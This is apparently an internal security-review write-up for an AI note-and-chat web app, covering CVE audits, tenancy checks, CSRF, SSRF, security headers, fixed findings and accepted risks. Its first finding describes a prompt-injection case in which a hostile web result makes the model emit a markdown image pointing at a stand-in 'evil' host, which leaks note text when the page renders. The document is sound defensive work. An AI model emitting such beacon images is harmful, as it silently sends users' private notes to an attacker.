# 15 — Security pass (2026-11-20)

## Question

After accounts landed ([14-accounts-auth.md](14-accounts-auth.md)), is anything in the whole app exploitable or fragile: known CVEs, cross-tenant access, injection, CSRF, SSRF, exfiltration through model output, denial of service, secret leaks? Fix what is cheap now and write down what is accepted.

## Method

| Check | How | Result |
| --- | --- | --- |
| Python CVEs | `pip-audit` (PyPI advisory DB) over `pip freeze` of `services/api/.venv` | No known vulnerabilities |
| npm CVEs | `npm audit` in `apps/web` | 5 low (one katex advisory, nested copies). Fixed. Now 0 |
| Authorization | Read every route in `main.py` and `auth_routes.py`. Check session dependency, owner check, and how ids reach SQL | All domain routes scoped. One unthrottled password check. Fixed |
| SQL | Grep for string-built queries | Only `f"SELECT {_USER_COLS} …"`, a module constant. Values are always parameters |
| Model output | Read the Streamdown and `rehype-harden` config. Seed a hostile reply and load it in Chrome | `javascript:` and `data:` links blocked by default. Remote images loaded. Fixed |
| Secrets | Grep git history and the API log for `sk-…`, `AIza…`, private keys, `X-Provider-Key` | Only the test fixture `sk-test-secret-value-123456` |
| Headers | `curl -I` on the API and on the Vite dev and preview servers. Chrome run of the built app under the production CSP | Missing before. Added. Zero CSP violations across login, chat, KaTeX, code, tables, BlockNote autosave, and the account pages |

## Installed versions and floors

| Package | Installed | Floor and why |
| --- | --- | --- |
| fastapi | 0.165.0 | `>=0.163.2`, GHSA-f56c-v883-vx8r |
| starlette | 1.10.0 | `>=1.3.1`, CVE-2026-48817/48818/54282/54283 |
| authlib | 1.9.10 | `>=1.9.10`, see doc 14 |
| h11 | 0.16.0 | `>=0.16.0`, CVE-2025-43859 request smuggling |
| python-multipart | not installed | `>=0.0.32` if form parsing is ever added |
| react-router | 8.5.2 | `>=8.5.1`, declarative mode only (no loaders, no SSR) |
| katex | 0.19.1 everywhere | `>=0.19.1`, GHSA-238p-pmpm-9mq7. `overrides` in `package.json` pins nested copies |
| vite | 6.4.5 | Dev server binds to localhost. Audit is clean |
| Postgres | 17.11 (`pgvector/pgvector:pg17`) | Bound to `127.0.0.1:5434` |

Authlib 1.9 and Starlette's test client warn that the `httpx` integration is deprecated in favor of `httpx2`. That is not a vulnerability. Move when Authlib drops `httpx`.

## Findings fixed

| # | Finding | Severity | Fix | Test |
| --- | --- | --- | --- | --- |
| 1 | Chat replies rendered remote images. A prompt-injected web result could make the model emit `![](https://evil/?q=<notes>)`, and the browser would leak note text on render, with no click | High (web mode) | `ChatImage` renders every image as a link the reader must click. Raw `<img>` too | Browser: 0 requests to the beacon host |
| 2 | Argon2 ran on the event loop. A burst of logins stalled every request, streams included | Medium (DoS) | `hash_password_async` and `verify_password_async` use `asyncio.to_thread`. The default pool also caps concurrent 19 MiB hashes | Suite |
| 3 | No request body cap. Page-block payloads are free-form dicts | Medium (DoS, storage) | `HttpHardening` answers 413 `too_large` above 2 MiB | `test_hardening_headers_body_cap_and_no_docs` |
| 4 | `DELETE /v1/me` checked the password without a limit. A stolen session became a password oracle | Medium | Shares the per-user `reauth:user:` bucket with password change (10 per 15 min) | `test_delete_account_password_check_is_rate_limited` |
| 5 | No security headers on the API or the page | Medium (clickjacking, sniffing) | API: CSP `default-src 'none'; frame-ancestors 'none'`, nosniff, DENY, `no-referrer`, CORP same-origin, `no-store` by default, HSTS when cookies are secure. Page: the policy below | Test plus `curl` |
| 6 | Login kept the browser's previous session row alive | Low | `_start_session` deletes the cookie's session first | `test_login_replaces_the_browsers_previous_session` |
| 7 | Google start and callback caught only `OAuthError`. A bad id_token or a network fault gave a raw 500 | Low (fault UX) | Any failure redirects to `/login?error=google` and logs only the exception type | Code review |
| 8 | Generated `/docs`, `/redoc`, `/openapi.json` were public | Low (surface) | Off. `contracts/openapi.yaml` is the contract | Test |
| 9 | nested katex 0.16 (GHSA-238p-pmpm-9mq7) | Low | `"overrides": {"katex": "$katex"}` | `npm audit` 0, browser math render |

## Controls verified sound

- **Tenancy.** Every project, chat, page, block, and turn route depends on `current_user`, then `owned()`. Another user's id is a 404, same as a missing one. A turn's `pageId` is only honored if it is in the chat's project. Search, chunk sync, and note writes are keyed by that project id. Covered by `test_other_users_data_is_not_found`.
- **CSRF.** `OriginGuard` needs `X-Tidyai-Csrf: 1` plus an allowed Origin on every unsafe method. There is no CORS. Cookies are SameSite=Lax and HttpOnly, with `__Host-` over https.
- **Enumeration.** Signup, forgot, and resend always answer 202. Wrong password and unknown email return the same 401, and both paths spend one Argon2 call.
- **Google.** PKCE S256, `state`, and `nonce` via Authlib. Accounts key on `sub`. The email is trusted only when `email_verified` is true. The pre-account-hijack guard drops an unverified squatter's password and sessions.
- **SSRF.** In hosted mode, provider URLs must be https on 443. DNS is resolved once, non-public answers are rejected (including mapped and NAT64 IPv6), and the dial is pinned to the vetted IP with SNI. Redirects are errors.
- **Provider key.** Only `X-Provider-Key`. It is never in a JSON body, log, or SSE event. `sk-…` and `AIza…` are redacted from provider errors. The browser vault key is non-extractable.
- **Rendering.** No `dangerouslySetInnerHTML`. KaTeX `trust: false`. Notes drop image, video, audio, and file blocks.
- **Tokens in URLs.** Verify and reset tokens ride in the fragment. The page strips them with `history.replaceState`, and `<meta name="referrer" content="no-referrer">` is set.

## Production page CSP

`vite preview` sends this. Whatever serves `dist/` in hosted mode must send the same header, plus the API headers above and HSTS:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' data: https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self';
worker-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'
```

`style-src 'unsafe-inline'` stays because React style attributes, KaTeX, and BlockNote write inline styles. Script injection is what CSP must stop, and `script-src 'self'` with no inline script does that. The theme bootstrap is `/theme-init.js` so no hash is needed. Dev drops `script-src` because HMR injects inline code.

## Accepted risks (ceilings)

| Risk | Why accepted | Upgrade when |
| --- | --- | --- |
| Rate limits live in Postgres, one row per attempt | Holds across workers, no new service | Real abuse: Redis or an edge limiter |
| No breached-password check | 15-character minimum plus a blocklist, and online guessing is throttled | Abuse shows up: k-anonymity range API |
| Uvicorn's access log records the Google callback's `code` and `state` | The code is single-use and PKCE-bound, so it is useless without the verifier | Hosted logs leave the box: drop the query string in the access log format |
| A body over 2 MiB sent chunked (no Content-Length) gets FastAPI's 400 instead of 413 | Browsers always send Content-Length. Still capped | Never, unless a client streams uploads |
| No per-user turn limit | The user pays the provider with their own key. Server cost per turn is small | Hosted with a server-paid embedding model |
| Linking Google to an existing verified password account by matching email | Both sides proved the inbox | A Workspace domain is untrusted: require a password confirm before linking |
| No MFA, no email change | Not in this slice | Accounts hold anything beyond study notes |

## Hosted deployment checklist

1. `TIDYAI_EGRESS=hosted`, `TIDYAI_PUBLIC_URL=https://…`, `TIDYAI_SESSION_SECRET` of 32 or more random characters. Config refuses to boot without them.
2. Serve `dist/` with the production CSP, nosniff, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, and HSTS.
3. Proxy `/api` to uvicorn on the same origin. Run uvicorn with `--proxy-headers --forwarded-allow-ips=<proxy ip>` so rate limits see the real client.
4. Configure SMTP. Hosted mode never logs a mail body.
5. Postgres is not public. Use a real password and keep it out of git.

## How to rerun

```bash
python3 -m venv /tmp/audit-venv && /tmp/audit-venv/bin/pip install pip-audit
cd services/api && .venv/bin/pip freeze --exclude-editable > /tmp/freeze.txt && /tmp/audit-venv/bin/pip-audit -r /tmp/freeze.txt
cd apps/web && npm audit
```

## What would overturn this

A provider host that needs redirects, a feature that renders remote media on purpose, or hosting with server-paid model calls. Each one reopens findings 1, 3, or the turn-limit row.
